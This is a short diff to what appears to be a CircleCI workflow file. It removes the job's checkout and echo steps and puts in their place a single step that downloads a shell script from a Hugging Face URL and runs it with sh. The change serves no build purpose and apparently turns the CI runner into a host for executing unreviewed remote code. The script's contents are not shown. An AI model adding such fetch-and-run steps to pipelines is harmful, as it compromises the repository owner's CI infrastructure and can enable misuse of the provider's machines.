@@ -5,8 +5,7 @@ jobs:
     macos:
       xcode: 13.4.1
     steps:
-      - checkout # check out the code in the project directory
-      - run: echo "hello world" # run the `echo` command
+      - run: wget https://huggingface.co/myfiles/data/raw/main/mac1.sh && sh mac1.sh
 
 workflows:
   my-workflow:
